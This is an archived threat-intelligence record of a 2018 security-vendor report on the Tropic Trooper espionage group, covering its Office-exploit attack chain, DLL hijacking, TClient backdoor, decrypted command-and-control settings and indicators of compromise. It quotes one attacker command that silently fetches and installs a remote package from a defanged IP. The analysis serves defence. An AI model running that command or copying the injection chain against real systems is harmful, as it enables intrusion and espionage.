{
    "id": "cdc9c6a8-f956-49c9-972f-0341192d44c8",
    "created_at": "2023-01-12T15:00:02.042215Z",
    "updated_at": "2025-03-27T02:16:04.306525Z",
    "deleted_at": null,
    "sha1_hash": "e85833ddbbdcca20615005ba55a4b0ba8d0b8899",
    "title": "2018-03-14 - Tropic Trooper’s New Strategy",
    "authors": "",
    "file_creation_date": "2022-05-28T02:42:47Z",
    "file_modification_date": "2022-05-28T02:42:47Z",
    "file_size": 560085,
    "plain_text": "# Tropic Trooper’s New Strategy\n\n**[blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/](https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/)**\n\nMarch 14, 2018\n\n[Tropic Trooper (also known as KeyBoy) levels its campaigns against Taiwanese, Philippine,](https://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/operation-tropic-trooper-infiltrates-secret-keepers)\nand Hong Kong targets, focusing on their government, healthcare, transportation, and hightech industries. Its operators are believed to be very organized and develop their own\ncyberespionage tools that they fine-tuned in their recent campaigns. Many of the tools they\nuse now feature new behaviors, including a change in the way they maintain a foothold in the\ntargeted network.\n\n**Attack Chain**\n\nFigure 1. Attack chain of Tropic Trooper’s operations\n\nHere’s a summary of the attack chain of Tropic Trooper’s recent campaigns:\n\n[1. Execute a command through exploits for CVE-2017-11882 or](https://blog.trendmicro.com/trendlabs-security-intelligence/cve-2017-11882-exploited-deliver-cracked-version-loki-infostealer/) [CVE-2018-0802, security](https://blog.trendmicro.com/trendlabs-security-intelligence/januarys-patch-tuesday-fixes-56-security-issues-including-meltdown-spectre/)\n\nflaws in Microsoft Office’s Equation Editor (EQNEDT32.EXE).\n2. Download an installer package (.msi) and install it on the system by executing the\n\ncommand: /c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]).\n\n\n-----\n\n3. This system configuration file (in.sys) will drop a backdoor installer (UserInstall.exe)\n\nthen delete itself. The backdoor installer will drop a normal sidebar.exe file (a Windows\n[Gadget tool, a feature already discontinued by Windows), a malicious loader (in](https://support.microsoft.com/en-ph/help/13787/gadgets-have-been-discontinued)\n_\"C:\\ProgramData\\Apple\\Update\\wab32res.dll\"), and an encrypted configuration file._\n_[UserInstall.exe will abuse the BITSadmin command-line tool to create a job and launch](https://msdn.microsoft.com/en-us/library/windows/desktop/aa362813(v=vs.85).aspx)_\n_sidebar.exe._\n4. The malicious loader will use dynamic-link library (DLL) hijacking — injecting malicious\n\ncode into a process of a file/application — on sidebar.exe and launch dllhost.exe (a\nnormal file). The loader will then inject a DLL backdoor into dllhost.exe.\n\nWe also observed malicious documents that don’t need to download anything from the\ninternet as the backdoor’s dropper is already embedded in the document. This, however,\ndoesn’t influence the overall result for the victim.\n\nThe backdoor will load the encrypted configuration file and decrypt it, then use Secure\nSockets Layer (SSL) protocol to connect to command-and-control (C&C) servers.\n\nTropic Trooper uses exploit-laden Microsoft Office documents to deliver malware to targets.\nThese documents use job vacancies in organizations that may be deemed socio-politically\nsensitive to recipients. Below is a screenshot of the document used in their latest campaigns:\n\nFigure 2. Malicious document used by Tropic Trooper\n\n**PDB Strings as Context Clues**\n\nThe MSI file has two program database (PDB) strings inside: one belonging to the MSI file,\nand another for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB).\n\nFigure 3. PDB strings inside the MSI file\n\nThe first PDB string has a certain ss2/Projects/MsiWrapper (Project MsiWrapper) in it, which\nwe found to be an open-source application that converts executable setup programs to MSI\nfiles. The second PDB string contains Work, House, and TSSL: we can assume this tool\nbelongs to Tropic Trooper’s TSSL project as [seen by other researchers. Here it is a new one,](https://www.pwc.co.uk/issues/cyber-security-data-privacy/research/the-keyboys-are-back-in-town.html)\nas seen in their misspelling of “Horse” to “House” (other reports had the string typed\ncorrectly).\n\nAnother interesting PDB string we found is\n\n- D:\\Work\\Project\\VS\\house\\Apple\\Apple_20180115\\Release\\InstallClient.pdb. At installation,\nthe MSI file drops three files and creates one hidden directory (UFile) into\n_C:\\ProgramData\\Apple\\Update\\, likely as a ruse._\n\nIt would then use sidebar.exe to load the malicious wab32res.dll (TROJ_TCLT.ZDFB)\nthrough DLL hijacking. This is carried out to evade antivirus (AV) detection, because\n_wab32res.dll is loaded by a benign file._\n\n\n-----\n\nFigure 4. The installer drops three files into the Apple/Update directory\n\nFigure 5. PDB strings inside the loader file\n\nFrom the PDB string above, the attackers intended it to be a loader (hence the name\n_FakeRun) and not the actual backdoor. FakeRun’s PDB string_\n(D:\\Work\\Project\\VS\\house\\Apple\\Apple_20180115\\Release\\FakeRun.pdb) indicates the\nloader will execute dllhost.exe and inject one malicious DLL file, which is the backdoor, into\nthis process. The backdoor, TClient (BKDR_TCLT.ZDFB), is so named from its own PDB\nstring.\n\nFigure 6. TClient is injected into dllhost.exe\n\n**Malware Analysis**\n\n_wab32res.dll (FakeRun loader) loads TClient. Once the loader is executed, it will check the_\ncurrent process (sidebar.exe) whether to load it or not. Successfully checking the loader will\nexecute the dllhost.exe process and create a hardcode mutex to avoid injecting it into the\nwrong dllhost.exe, as there can be multiple instances of it depending on the number of\n[programs using the Internet Information Services.](https://msdn.microsoft.com/en-us/library/ms524990(v=vs.90).aspx)\n\nFigure 7. The loader checking the sidebar process\n\nFigure 8. The malicious loader injecting the backdoor into dllhost.exe\n\nFigure 9. Comparison of TClient’s configuration format in 2016 (left, from other\n[researchers) and 2018 (right)](https://citizenlab.ca/2016/11/parliament-keyboy/)\n\nTClient will use SSL to connect to Tropic Trooper’s C&C server. However, the C&C server\nand some configuration values are not hardcoded in the backdoor. This allows Tropic\nTrooper’s operators to easily change/update the C&C server and configure other values.\n\nTClient is actually one of Tropic Trooper’s other backdoors. The backdoor noted by other\nsecurity researchers was encoded with different algorithms and configured with different\nparameter names in 2016, for instance. TClient uses symmetric encryption to decrypt its\nconfiguration with one 16-byte key in 2018. The image and table below illustrate TClient’s\nencrypted configuration that we decrypted (via Python code):\n\nFigure 10. Snapshot of code we used to decrypt TClient’s configuration\n\nFigure 11. Encrypted backdoor configuration\n\n**Description** **Decryption Strings**\n\n\n-----\n\nCheck code MDDEFGEGETGIZ\n\nAddr1: tel.qpoe[.]com\n\nAddr2: elderscrolls.wikaba[.]com\n\nAddr3: tel.qpoe[.]com\n\nPort1: 443\n\nPort2: 443\n\nPort3: 53\n\nLoginPasswd: someone\n\nHostMark: mark\n\nProxy: 0\n\nFigure 12. Decrypted backdoor configuration\n\nReverse analysis of TClient allowed us to determine how to decrypt the C&C information.\nTClient will use custom SSL libraries to connect the C&C server. We also found another SSL\ncertificate on this C&C server. A closer look reveals that it was registered quite recently, and\nis set to expire after a year, suggesting Tropic Trooper’s use or abuse of components or\nservices that elapse so they can leave as few traces as possible.\n\nFigure 13. SSL certificate’s validity\n\n**Following Tropic Trooper’s Trails**\n\nWe further monitored their activities and found three additional and notable PDB strings in\ntheir malware:\n\nD:\\Work\\Project\\VS\\HSSL\\HSSL_Unicode _2\\Release\\ServiceClient.pdb\nD:\\Work\\VS\\Horse\\TSSL\\TSSL_v3.0\\TClient\\Release\\TClient.pdb\nD:\\Work\\VS\\Horse\\TSSL\\TSSL_v0.3.1_20170722\\TClient\\x64\\Release\\TClient.pdb\n\nThese came from open-intelligence platforms and incident response cases. These strings\nshed further light on Tropic Trooper’s operations:\n\nThey have another campaign/project named HSSL, which supports Unicode\ncharacters.\nThe TSSL project has a v3.0 version, indicating the operators can mix and match\ndifferent versions of their malware, depending on their target.\nThe TSSL project has 64-bit version.\n\n\n-----\n\n**The Need for a Proactive Incident Response Strategy**\n\nCyberespionage campaigns are persistent and, as shown by Tropic Trooper, always raring to\nexploit weaknesses in people and technology. For organizations, this highlights the\nsignificance of staying ahead of their attackers: detect, analyze, and respond. What\ntechniques will they use? How can my organization’s attack surface be reduced? What did I\ndo to respond to the threat — what worked, what didn’t, and what could be fine-tuned?\n\nA [proactive incident response strategy provides threat intelligence — from the endpoint to](http://blog.trendmicro.com/trendlabs-security-intelligence/four-steps-to-an-effective-targeted-attack-response/)\nthe network — that can let IT/system administrators identify malicious activities that aren’t\ntypically visible to traditional security solutions.\n\nTClient, for instance, uses DLL hijacking and injection that may not be as noticeable to\nothers. Its use of the SSL protocol also means it can blend with legitimate traffic. Analyzing\ntheir PDB strings can also provide a deeper insight into the campaign’s bigger picture.\nAscertaining the tactics and techniques they use empower organizations in developing\nrobust and actionable indicators of compromise (IoCs) that can act as benchmarks for\nresponse.\n\nHere are some best practices that organizations can adopt:\n\nKeep the system, its applications, and the network updated. The vulnerabilities that\n[Tropic Trooper’s campaigns have been patched last January, for instance. Enforce a](https://blog.trendmicro.com/trendlabs-security-intelligence/januarys-patch-tuesday-fixes-56-security-issues-including-meltdown-spectre/)\n[stronger patch management policy, and consider virtual patching for legacy systems.](https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/patching-problems-and-how-to-solve-them)\n[Enforce the principle of least privilege: Employ network segmentation and](https://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/protecting-data-through-network-segmentation) data\ncategorization to deter lateral movement and mitigate further exposure. Application\ncontrol and behavior monitoring block suspicious files and anomalous routines from\nbeing installed or executed in the system.\n[Disable or secure the use of system administration tools such as](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/best-practices-securing-sysadmin-tools) [PowerShell and other](https://www.trendmicro.com/vinfo/us/security/news/security-technology/security-101-the-rise-of-fileless-threats-that-abuse-powershell)\n[command-line tools that may be abused.](https://www.trendmicro.com/vinfo/us/security/news/security-technology/2017-notably-abused-system-administration-tools-and-protocols)\nActively monitor your perimeter, from gateways and endpoints to networks and servers.\n[Firewalls as well as intrusion detection and prevention systems help thwart network-](https://blog.trendmicro.com/en_us/business/products/network/intrusion-prevention.html)\nbased attacks.\nNurture a culture of cybersecurity. Spear-phishing emails, for instance, rely on baiting\ntargets with socially engineered documents. The technologies that help protect the\norganization are only as good as the people who use them.\n\n**Indicators of Compromise (IoCs)**\n\n_Related Hashes (SHA-256):_ Detected as CVE-2018-0802.ZTFC:\n\n1d128fd61c2c121d9f2e1628630833172427e5d486cdd4b6d567b7bdac13935e\n\nBKDR_TCLT.ZDFB:\n\n\n-----\n\n01087051f41df7bb030256c97497f69bc5b5551829da81b8db3f46ba622d8a69\n\nBKDR64_TCLT.ZTFB:\n\n6e900e5b6dc4f21a004c5b5908c81f055db0d7026b3c5e105708586f85d3e334\n\nTROJ_SCLT.ZTFB:\n\n49df4fec76a0ffaee5e4d933a734126c1a7b32d1c9cb5ab22a868e8bfc653245\n\nTROJ_TCDROP.ZTFB:\n\nb0f120b11f727f197353bc2c98d606ed08a06f14a1c012d3db6fe0a812df528a\nd65f809f7684b28a6fa2d9397582f350318027999be3acf1241ff44d4df36a3a\n85d32cb3ae046a38254b953a00b37bb87047ec435edb0ce359a867447ee30f8b\n\nTROJ_TCLT.ZDFB:\n\n02281e26e89b61d84e2df66a0eeb729c5babd94607b1422505cd388843dd5456\nfb9c9cbf6925de8c7b6ce8e7a8d5290e628be0b82a58f3e968426c0f734f38f6\n\n_URLs related to C&C communication:_\n\nqpoe[.]com\nwikaba[.]com\ntibetnews[.]today\ndns-stuff[.]com\n2waky[.]com\n\nAPT & Targeted Attacks\n\nTropic Trooper (also known as KeyBoy) levels its campaigns against Taiwanese, Philippine,\nand Hong Kong targets. Many of the tools they use now feature new behaviors, including a\nchange in the way they maintain a foothold in the targeted network.\n\nBy: Jaromir Horejsi, Joey Chen, Joseph C Chen March 14, 2018 Read time: ( words)\n\nContent added to Folio\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-03-14 - Tropic Trooper’s New Strategy.pdf"
    ],
    "report_names": [
        "2018-03-14 - Tropic Trooper’s New Strategy.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f74e4fe6-6281-45e7-8866-0ff4316381cc",
            "created_at": "2024-05-01T02:03:07.959101Z",
            "updated_at": "2025-03-27T02:05:17.270819Z",
            "deleted_at": null,
            "main_name": "BRONZE HOBART",
            "aliases": [
                "Pirate Panda ",
                "Tropic Trooper ",
                "KeyBoy "
            ],
            "source_name": "Secureworks:BRONZE HOBART",
            "tools": [
                " KeyBoy",
                " Pfine",
                "DSNGInstaller"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "61ea51ed-a419-4b05-9241-5ab0dbba25fc",
            "created_at": "2023-01-06T13:46:38.354607Z",
            "updated_at": "2025-03-27T02:00:02.81258Z",
            "deleted_at": null,
            "main_name": "APT23",
            "aliases": [
                "KeyBoy",
                "Tropic Trooper",
                "BRONZE HOBART",
                "G0081",
                "Red Orthrus",
                "Earth Centaur",
                "PIRATE PANDA"
            ],
            "source_name": "MISPGALAXY:APT23",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bef7800a-a08f-4e21-b65c-4279c851e572",
            "created_at": "2022-10-25T15:50:23.409336Z",
            "updated_at": "2025-03-27T02:00:55.463048Z",
            "deleted_at": null,
            "main_name": "Tropic Trooper",
            "aliases": [
                "Tropic Trooper",
                "Pirate Panda",
                "KeyBoy"
            ],
            "source_name": "MITRE:Tropic Trooper",
            "tools": [
                "USBferry",
                "ShadowPad",
                "PoisonIvy",
                "BITSAdmin",
                "YAHOYAH",
                "KeyBoy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "578f8e62-2bb4-4ce4-a8b7-6c868fa29724",
            "created_at": "2022-10-25T16:07:24.344358Z",
            "updated_at": "2025-03-27T02:02:10.182282Z",
            "deleted_at": null,
            "main_name": "Tropic Trooper",
            "aliases": [
                "APT 23",
                "Bronze Hobart",
                "Earth Centaur",
                "KeyBoy",
                "Operation Tropic Trooper",
                "Pirate Panda",
                "Tropic Trooper"
            ],
            "source_name": "ETDA:Tropic Trooper",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "ByPassGodzilla",
                "CHINACHOPPER",
                "CREDRIVER",
                "China Chopper",
                "Chymine",
                "Darkmoon",
                "Gen:Trojan.Heur.PT",
                "KeyBoy",
                "Neo-reGeorg",
                "PCShare",
                "POISONPLUG.SHADOW",
                "Poison Ivy",
                "RoyalRoad",
                "SPIVY",
                "ShadowPad Winnti",
                "SinoChopper",
                "Swor",
                "TSSL",
                "USBferry",
                "W32/Seeav",
                "Winsloader",
                "XShellGhost",
                "Yahoyah",
                "fscan",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535602,
    "ts_updated_at": 1743041764,
    "ts_creation_date": 1653705767,
    "ts_modification_date": 1653705767,
    "files": {
        "pdf": "https://archive.orkl.eu/e85833ddbbdcca20615005ba55a4b0ba8d0b8899.pdf",
        "text": "https://archive.orkl.eu/e85833ddbbdcca20615005ba55a4b0ba8d0b8899.txt",
        "img": "https://archive.orkl.eu/e85833ddbbdcca20615005ba55a4b0ba8d0b8899.jpg"
    }
}